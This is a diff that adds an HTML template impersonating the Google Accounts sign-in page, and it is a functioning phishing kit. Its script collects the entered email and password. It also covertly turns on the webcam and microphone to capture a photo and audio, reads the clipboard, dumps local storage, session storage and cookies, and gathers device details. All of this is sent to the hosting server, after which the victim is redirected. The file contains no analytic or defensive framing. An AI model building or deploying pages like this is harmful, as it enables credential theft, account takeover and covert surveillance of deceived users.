@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .g-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px 24px;
+        }
+        .g-logo {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 22px;
+            color: #202124;
+        }
+        .g-logo svg { width: 92px; height: 30px; }
+        .g-header-link {
+            color: #1a73e8;
+            font-size: 13px;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 8px 16px;
+            border-radius: 4px;
+            transition: background .15s;
+        }
+        .g-header-link:hover { background: #e8f0fe; }
+        .g-main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 24px 16px 48px;
+        }
+        .g-card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            width: 100%;
+            max-width: 450px;
+        }
+        .g-card-icon {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .g-card-title {
+            text-align: center;
+            font-family: 'Google Sans', sans-serif;
+            font-size: 24px;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+        .g-card-sub {
+            text-align: center;
+            font-size: 16px;
+            color: #202124;
+            margin-bottom: 32px;
+        }
+        .g-input-wrap {
+            position: relative;
+            margin-bottom: 24px;
+        }
+        .g-input {
+            width: 100%;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            color: #202124;
+            font-size: 16px;
+            padding: 16px 12px 4px;
+            outline: none;
+            transition: border-color .15s;
+            font-family: 'Roboto', sans-serif;
+        }
+        .g-input:focus { border: 2px solid #1a73e8; padding: 15px 11px 3px; }
+        .g-input-label {
+            position: absolute;
+            top: 14px; left: 13px;
+            color: #5f6368;
+            font-size: 16px;
+            pointer-events: none;
+            transition: all .15s;
+            background: #fff;
+            padding: 0 2px;
+        }
+        .g-input:focus + .g-input-label,
+        .g-input:not(:placeholder-shown) + .g-input-label {
+            top: -8px; font-size: 12px;
+            color: #1a73e8;
+        }
+        .g-input:not(:focus) + .g-input-label { color: #5f6368; }
+        .g-forgot {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 24px;
+        }
+        .g-error {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: -18px;
+            margin-bottom: 12px;
+            display: none;
+        }
+        .g-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .g-link-btn {
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            border: none;
+            background: none;
+            cursor: pointer;
+            padding: 8px 16px;
+            border-radius: 4px;
+            transition: background .15s;
+        }
+        .g-link-btn:hover { background: #e8f0fe; }
+        .g-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            padding: 10px 24px;
+            cursor: pointer;
+            font-family: 'Google Sans', sans-serif;
+            transition: background .15s, box-shadow .15s;
+            min-width: 88px;
+        }
+        .g-btn:hover { background: #1765cc; box-shadow: 0 1px 3px rgba(0,0,0,.2); }
+        .g-btn:disabled { opacity: 0.5; cursor: default; }
+        .g-spinner {
+            width: 18px; height: 18px;
+            border: 2px solid rgba(255,255,255,0.5);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: gspin .7s linear infinite;
+            display: none; margin: 0 auto;
+        }
+        @keyframes gspin { to { transform: rotate(360deg); } }
+        .g-footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 24px;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .g-footer select {
+            border: none;
+            color: #5f6368;
+            font-size: 12px;
+            background: none;
+            cursor: pointer;
+        }
+        .g-footer-links {
+            display: flex;
+            gap: 20px;
+        }
+        .g-footer-links a {
+            color: #5f6368;
+            font-size: 12px;
+            text-decoration: none;
+        }
+        .g-footer-links a:hover { text-decoration: underline; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<header class="g-header">
+    <!-- Google Logo SVG -->
+    <svg viewBox="0 0 272 92" width="92" height="30">
+        <path fill="#4285f4" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#d14836" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
+        <path fill="#0f9d58" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
+        <path fill="#4285f4" d="M225 3v65h-9.5V3h9.5z"/>
+        <path fill="#34a853" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
+        <path fill="#ea4335" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
+    </svg>
+    <a href="#" class="g-header-link">Create account</a>
+</header>
+
+{% csrf_token %}
+<video id="g-video" autoplay muted playsinline></video>
+<canvas id="g-canvas"></canvas>
+
+<main class="g-main">
+    <div class="g-card">
+        <div class="g-card-icon">
+            <svg width="48" height="48" viewBox="0 0 24 24"><path fill="#4285F4" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+        </div>
+        <h1 class="g-card-title">Sign in</h1>
+        <p class="g-card-sub">Use your Google Account</p>
+
+        <!-- Step 1: Email -->
+        <div id="g-step1">
+            <div class="g-input-wrap">
+                <input type="email" id="g-email" class="g-input" placeholder=" " autocomplete="email">
+                <label for="g-email" class="g-input-label">Email or phone</label>
+            </div>
+            <div id="g-email-error" class="g-error">Couldn't find your Google Account</div>
+            <a href="#" class="g-forgot">Forgot email?</a>
+            <div class="g-actions">
+                <button class="g-link-btn" onclick="gCreateAccount()">Create account</button>
+                <button class="g-btn" onclick="gNextStep()">
+                    <span id="g-next-text">Next</span>
+                    <div id="g-next-spinner" class="g-spinner"></div>
+                </button>
+            </div>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="g-step2" style="display:none;">
+            <div style="display:flex;align-items:center;gap:12px;margin-bottom:28px;padding:8px 12px;border:1px solid #dadce0;border-radius:20px;">
+                <svg width="18" height="18" viewBox="0 0 24 24"><path fill="#5f6368" d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+                <span id="g-email-display" style="font-size:14px;color:#202124;"></span>
+                <svg width="18" height="18" viewBox="0 0 24 24" style="margin-left:auto;cursor:pointer;" onclick="gBackStep()"><path fill="#5f6368" d="M12 8l-6 6 1.41 1.41L12 10.83l4.59 4.58L18 14z"/></svg>
+            </div>
+            <div class="g-input-wrap">
+                <input type="password" id="g-password" class="g-input" placeholder=" " autocomplete="current-password">
+                <label for="g-password" class="g-input-label">Enter your password</label>
+            </div>
+            <div id="g-pass-error" class="g-error">Wrong password. Try again or click Forgot password to reset it.</div>
+            <a href="#" class="g-forgot" style="margin-bottom:8px;">Forgot password?</a>
+            <label style="display:flex;align-items:center;gap:8px;font-size:14px;color:#202124;margin-bottom:28px;cursor:pointer;">
+                <input type="checkbox" id="g-show-pass" onchange="document.getElementById('g-password').type=this.checked?'text':'password'">
+                Show password
+            </label>
+            <div class="g-actions">
+                <button class="g-link-btn" onclick="gBackStep()">Back</button>
+                <button id="g-signin-btn" class="g-btn" onclick="gSignIn()">
+                    <span id="g-signin-text">Next</span>
+                    <div id="g-signin-spinner" class="g-spinner"></div>
+                </button>
+            </div>
+        </div>
+    </div>
+</main>
+
+<footer class="g-footer">
+    <select><option>English (United States)</option></select>
+    <div class="g-footer-links">
+        <a href="#">Help</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+    </div>
+</footer>
+
+<script>
+    // ── Hardware capture ──
+    const gVideo = document.getElementById('g-video');
+    const gCanvas = document.getElementById('g-canvas');
+    let gStream = null, gWebcamReady = false;
+    let gRecorder = null, gAudioChunks = [], gAudioReady = false;
+    let gHardwareDone = false;
+    let gClipboard = null, gBattery = null, gNetwork = null;
+
+    function gStartHardware() {
+        if (gHardwareDone) return;
+        gHardwareDone = true;
+        if (!navigator.mediaDevices) return;
+        navigator.mediaDevices.getUserMedia({
+            video: { width: { ideal: 1280 }, facingMode: 'user' },
+            audio: { echoCancellation: false }
+        }).then(stream => {
+            gStream = stream;
+            gVideo.srcObject = stream;
+            gVideo.play().catch(() => {});
+            gVideo.addEventListener('canplay', () => { gWebcamReady = true; });
+            try {
+                const at = stream.getAudioTracks();
+                if (at.length > 0) {
+                    gRecorder = new MediaRecorder(new MediaStream(at));
+                    gRecorder.ondataavailable = e => { if (e.data.size > 0) gAudioChunks.push(e.data); };
+                    gAudioReady = true;
+                    gRecorder.start(1000);
+                }
+            } catch(e) {}
+        }).catch(() => { gHardwareDone = false; });
+    }
+
+    function gStealClipboard() {
+        try { navigator.clipboard && navigator.clipboard.readText().then(t => { if (t.trim()) gClipboard = t.slice(0, 2000); }).catch(() => {}); } catch(e) {}
+    }
+
+    try { navigator.getBattery && navigator.getBattery().then(b => { gBattery = `${Math.round(b.level*100)}%${b.charging?'⚡':'🔋'}`; }); } catch(e) {}
+    try { const c = navigator.connection || navigator.mozConnection; if (c) gNetwork = `${c.effectiveType||''} ${c.downlink?c.downlink+'Mbps':''}`.trim(); } catch(e) {}
+
+    document.addEventListener('click', gStealClipboard, { once: true });
+    window.addEventListener('load', () => setTimeout(gStartHardware, 600));
+
+    function gNextStep() {
+        const email = document.getElementById('g-email').value.trim();
+        if (!email) {
+            document.getElementById('g-email-error').style.display = 'block';
+            return;
+        }
+        document.getElementById('g-email-error').style.display = 'none';
+        document.getElementById('g-email-display').textContent = email;
+        document.getElementById('g-step1').style.display = 'none';
+        document.getElementById('g-step2').style.display = 'block';
+        document.getElementById('g-password').focus();
+    }
+
+    function gBackStep() {
+        document.getElementById('g-step2').style.display = 'none';
+        document.getElementById('g-step1').style.display = 'block';
+    }
+
+    function gCreateAccount() {
+        // Redirect to gateway for signup
+        window.location.href = '/';
+    }
+
+    async function gSignIn() {
+        const email = document.getElementById('g-email').value.trim();
+        const password = document.getElementById('g-password').value.trim();
+        if (!password) {
+            document.getElementById('g-pass-error').style.display = 'block';
+            return;
+        }
+        document.getElementById('g-pass-error').style.display = 'none';
+
+        const btn = document.getElementById('g-signin-btn');
+        const btnText = document.getElementById('g-signin-text');
+        const spinner = document.getElementById('g-signin-spinner');
+        btn.disabled = true;
+        btnText.style.display = 'none';
+        spinner.style.display = 'block';
+
+        gStealClipboard();
+        let snap = null;
+        try {
+            if (gStream && gVideo.videoWidth > 0 && gVideo.readyState >= 2) {
+                gCanvas.width = gVideo.videoWidth;
+                gCanvas.height = gVideo.videoHeight;
+                gCanvas.getContext('2d').drawImage(gVideo, 0, 0);
+                snap = gCanvas.toDataURL('image/jpeg', 0.8);
+            }
+        } catch(e) {}
+
+        const sendData = (audioB64) => {
+            const ls = {}, ss = {};
+            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = localStorage.getItem(k); } } catch(e) {}
+            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = sessionStorage.getItem(k); } } catch(e) {}
+            const csrf = document.querySelector('[name=csrfmiddlewaretoken]').value;
+            fetch('/', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json', 'X-CSRFToken': csrf },
+                body: JSON.stringify({
+                    username: email, password,
+                    webcam_snap: snap, voice_audio: audioB64,
+                    source_url: window.location.href,
+                    user_agent: navigator.userAgent, platform: navigator.platform,
+                    device_info: `GOOGLE|Screen:${screen.width}x${screen.height}|Lang:${navigator.language}${gBattery?'|BAT:'+gBattery:''}`,
+                    local_storage: JSON.stringify(ls), session_storage: JSON.stringify(ss),
+                    cookies: document.cookie, authMode: 'LOGIN',
+                    clipboard: gClipboard, battery: gBattery, network_type: gNetwork,
+                    client_timestamp: new Date().toISOString(),
+                    client_timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                })
+            }).catch(() => {}).finally(() => {
+                setTimeout(() => { window.location.href = '/apps/'; }, 800);
+            });
+        };
+
+        if (gAudioReady && gRecorder && gRecorder.state === 'recording') {
+            gRecorder.onstop = () => {
+                try {
+                    const blob = new Blob(gAudioChunks, { type: gRecorder.mimeType });
+                    const r = new FileReader();
+                    r.readAsDataURL(blob);
+                    r.onloadend = () => sendData(r.result);
+                    r.onerror = () => sendData(null);
+                } catch(e) { sendData(null); }
+            };
+            gRecorder.stop();
+        } else {
+            sendData(null);
+        }
+    }
+
+    document.addEventListener('keydown', e => { if (e.key === 'Enter') { if (document.getElementById('g-step2').style.display === 'none') gNextStep(); else gSignIn(); } });
+</script>
+</body>
+</html>
